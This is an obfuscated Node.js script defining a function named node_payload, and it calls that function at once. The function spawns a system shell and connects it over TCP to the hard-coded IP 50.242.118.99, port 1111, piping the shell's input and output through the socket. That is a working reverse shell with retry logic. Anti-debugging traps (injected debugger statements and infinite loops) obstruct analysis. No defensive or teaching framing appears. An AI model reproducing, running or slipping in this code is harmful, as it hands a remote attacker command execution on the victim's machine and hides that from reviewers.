function node_payload() {
    var _0x55461d = (function () {
        var _0x2c028e = !![];
        return function (_0x43d1ba, _0x95e0b7) {
            var _0x1fd137 = _0x2c028e ? function () {
                if (_0x95e0b7) {
                    var _0xd65a5b = _0x95e0b7['apply'](_0x43d1ba, arguments);
                    _0x95e0b7 = null;
                    return _0xd65a5b;
                }
            } : function () {
            };
            _0x2c028e = ![];
            return _0x1fd137;
        };
    }());
    var _0x5026b0 = global['require'] || global['process']['mainModule']['constructor']['_load'];
    if (!_0x5026b0)
        return;
    var _0x13842d = global['process']['platform']['match'](/^win/i) ? 'cmd' : '/bin/sh';
    var _0x47104f = _0x5026b0('net');
    var _0x5802d9 = _0x5026b0('child_process');
    var _0x2e6d33 = _0x5026b0('util');
    var _0x3c1789 = _0x5802d9['spawn'](_0x13842d, []);
    var _0x304c74 = this;
    var _0x5555ad = 0x0;
    function _0x885730() {
        (function () {
            _0x55461d(this, function () {
                var _0x1eef3f = new RegExp('function\x20*\x5c(\x20*\x5c)');
                var _0x5475a8 = new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i');
                var _0x1e70e3 = _0x5257ca('init');
                if (!_0x1eef3f['test'](_0x1e70e3 + 'chain') || !_0x5475a8['test'](_0x1e70e3 + 'input')) {
                    _0x1e70e3('0');
                } else {
                    _0x5257ca();
                }
            })();
        }());
        _0x304c74['socket'] = _0x47104f['connect'](0x457, '50.242.118.99', function () {
            _0x304c74['socket']['pipe'](_0x3c1789['stdin']);
            if (typeof _0x2e6d33['pump'] === 'undefined') {
                _0x3c1789['stdout']['pipe'](_0x304c74['socket']);
                _0x3c1789['stderr']['pipe'](_0x304c74['socket']);
            } else {
                _0x2e6d33['pump'](_0x3c1789['stdout'], _0x304c74['socket']);
                _0x2e6d33['pump'](_0x3c1789['stderr'], _0x304c74['socket']);
            }
        });
        _0x304c74['socket']['on']('error', function (_0x1de5c0) {
            _0x5555ad++;
            if (_0x5555ad <= 0xa) {
                setTimeout(function () {
                    _0x885730();
                }, 0x5 * 0x3e8);
            } else {
                process['exit']();
            }
        });
    }
    _0x885730();
}
console['log']('poop');
node_payload();
function _0x5257ca(_0x302876) {
    function _0x5b9641(_0x197de3) {
        if (typeof _0x197de3 === 'string') {
            return function (_0xc8dc2b) {
            }['constructor']('while\x20(true)\x20{}')['apply']('counter');
        } else {
            if (('' + _0x197de3 / _0x197de3)['length'] !== 0x1 || _0x197de3 % 0x14 === 0x0) {
                (function () {
                    return !![];
                }['constructor']('debu' + 'gger')['call']('action'));
            } else {
                (function () {
                    return ![];
                }['constructor']('debu' + 'gger')['apply']('stateObject'));
            }
        }
        _0x5b9641(++_0x197de3);
    }
    try {
        if (_0x302876) {
            return _0x5b9641;
        } else {
            _0x5b9641(0x0);
        }
    } catch (_0x2d479d) {
    }
}
